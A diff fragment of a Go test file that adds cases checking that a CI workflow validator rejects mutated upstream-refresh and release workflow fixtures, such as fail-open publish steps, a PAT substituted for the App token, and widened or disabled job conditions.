+		{"second publisher fails open", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        if: always()\n        run: ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n", "must pass the scope-guard result"},
+		{"second gated publisher", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        if: steps.secrets.outputs.present == 'true'\n        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n          TOOLCHAIN_SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.toolchain }}\n          TOOLCHAIN_REDERIVE_RESULT: ${{ needs.rederive.result == 'success' && needs.rederive.outputs.toolchain || 'failed' }}\n        run: |\n          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n", "run the publish script once"},
 		{"publish with a PAT", "GH_TOKEN: ${{ steps.app-token.outputs.token }}", "GH_TOKEN: ${{ secrets.OTHER_PAT }}", "must pass the App token as GH_TOKEN"},
 		{"toolchain refresh drops --toolchain-only", "./scripts/update-upstream-pins.sh --apply --toolchain-only | tee apply.log", "./scripts/update-upstream-pins.sh --apply | tee apply.log", "only with --toolchain-only"},
 		{"second full refresh in the provider step", "          ./scripts/ci/upstream-refresh-candidate.sh provider", "          ./scripts/update-upstream-pins.sh --apply\n          ./scripts/ci/upstream-refresh-candidate.sh provider", "only with --toolchain-only"},
@@ -1642,7 +1757,7 @@ func moveStepBefore(workflow, header, target string) string {
 func TestValidateUpstreamRefreshWorkflowRejectsEvasions(t *testing.T) {
 	t.Parallel()
 	RequireRejectsAllEvasions(t, upstreamRefreshWorkflowFixture,
-		"          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md",
+		"          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md",
 		"run the publish script once", metadatautil.ValidateUpstreamRefreshWorkflow)
 	const tokenFile = "          WORKCELL_GITHUB_API_TOKEN_FILE=\"${token_file}\" "
 	RequireRejectsAllEvasions(t, upstreamRefreshWorkflowFixture,
@@ -2259,7 +2374,8 @@ func TestWorkflowValidatorsRejectUnmodelledKeysAndJobConditions(t *testing.T) {
 		{"publish job skipped", release, "  publish-github-release:\n", "  publish-github-release:\n    if: false\n", "must run unconditionally", metadatautil.ValidateReleaseWorkflowPublicationGate},
 		{"verify job skipped", release, "  verify-release-outputs:\n", "  verify-release-outputs:\n    if: false\n", "must run unconditionally", metadatautil.ValidateReleaseWorkflowPublicationGate},
 		{"release job skipped", release, "  release:\n", "  release:\n    if: false\n", "must run unconditionally", releaseAuthorityValidator(t)},
-		{"upstream publish job skipped", upstreamRefreshWorkflowFixture, "needs: [refresh, scope-guard]\n" + onCandidate, "needs: [refresh, scope-guard]\n    if: false\n", "publish job must run only when", metadatautil.ValidateUpstreamRefreshWorkflow},
+		{"upstream publish job skipped", upstreamRefreshWorkflowFixture, "needs: [refresh, scope-guard, rederive]\n    if: ${{ !cancelled()", "needs: [refresh, scope-guard, rederive]\n    if: ${{ false && !cancelled()", "publish job must run only when", metadatautil.ValidateUpstreamRefreshWorkflow},
+		{"upstream rederive condition widened", upstreamRefreshWorkflowFixture, "needs: [refresh]\n" + onCandidate, "needs: [refresh]\n    if: always()\n", "rederive job must run only when", metadatautil.ValidateUpstreamRefreshWorkflow},
 		{"upstream scope-guard condition widened", upstreamRefreshWorkflowFixture, "needs: refresh\n" + onCandidate, "needs: refresh\n    if: always()\n", "scope-guard job must run only when", metadatautil.ValidateUpstreamRefreshWorkflow},
 	}
 	for _, testCase := range cases {
